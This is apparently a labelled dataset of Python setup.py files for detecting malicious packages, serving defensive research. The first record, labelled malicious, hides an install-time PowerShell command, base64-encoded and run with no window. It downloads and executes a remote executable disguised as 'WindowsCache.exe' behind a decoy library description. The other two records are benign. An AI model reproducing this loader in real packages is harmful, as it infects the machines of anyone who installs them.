{"idx": "tpvmstringgrand-10.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvmstringgrand',\n    packages = ['modlib'],\n    version = '2.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "freezegun-1.2.2", "func": "#!/usr/bin/env python\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "google-cloud-scheduler-2.7.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\n\nname = \"google-cloud-scheduler\"\ndescription = \"Cloud Scheduler API API client library\"\nversion = \"2.7.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.22.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <5.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-scheduler\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n    scripts=[\n        \"scripts/fixup_scheduler_v1_keywords.py\",\n        \"scripts/fixup_scheduler_v1beta1_keywords.py\",\n    ],\n)\n", "target": 0}
